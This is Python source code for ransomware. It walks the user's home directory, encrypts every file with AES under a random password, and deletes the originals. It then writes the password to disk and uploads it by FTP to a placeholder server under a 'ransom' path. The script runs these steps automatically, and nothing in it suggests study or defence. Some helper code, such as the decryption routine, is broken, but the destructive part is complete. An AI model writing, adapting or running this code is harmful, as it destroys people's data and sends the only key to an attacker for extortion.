from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources, ftplib, string, getpass

def encrypt(key, filename):
	chunksize = 64 * 1024
	outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = ''

	for i in range(16):
		IV += chr(random.randint(0, 0xFF))
	
	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, "rb") as infile:
		with open(outFile, "wb") as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			while True:
				chunk = infile.read(chunksize)
				
				if len(chunk) == 0:
					break

				elif len(chunk) % 16 !=0:
					chunk += ' ' *  (16 - (len(chunk) % 16))

				outfile.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
	outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
	chunksize = 64 * 1024
	with open(filename, "rb") as infile:
		filesize = infile.read(16)
		IV = infile.read(16)

		decryptor = AES.new(key, AES.MODE_CBC, IV)
		
		with open(outFile, "wb") as outfile:
			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))

			outfile.truncate(int(filesize))
	
def allfiles():
        if (os.path.exists('C://Windows/System32/cmd.exe')==True):
	    alldir = "C://Users/"+getpass.getuser()
        else:
            alldir = "/home/"+getpass.getuser()
	allFiles = []
	for root, subfiles, files in os.walk(alldir):
		for names in files:
			allFiles.append(os.path.join(root, names))

	return allFiles

	
chars = string.letters + string.digits
pwdSize = 11
password = ''.join((random.choice(chars)) for x in range(pwdSize))

encFiles = allfiles()

def makeencrypt():
	for Tfiles in encFiles:	
		if os.path.basename(Tfiles).startswith("(encrypted)"):
			pass 
		else:
			encrypt(SHA256.new(password).digest(), str(Tfiles))
			os.remove(Tfiles)


def makedecrypt():
	filename = encFiles
	if not os.path.exists(filename):
		sys.exit(0)
	elif not filename.startswith("(encrypted)"):
		sys.exit()
	else:
		decrypt(SHA256.new(password).digest(), filename)
		os.remove(filename)

def safety():
	root = os.path.abspath(os.sep)
	openpass = open(root+"/"+password+".txt", 'w')
	openpass.write(password)
	openpass.close()
	filename = password+".txt"
	ftp = ftplib.FTP("xx.xx.xx.xx")
	ftp.login("UID", "PSW")
	ftp.cwd("/root/PWARE/ransom/"+password+".txt")
	os.chdir(r""+root+"/"+password)
	myfile = open(filename, 'r')
	ftp.storlines('STOR ' + filename, myfile)
	myfile.close()

makeencrypt()
safety()
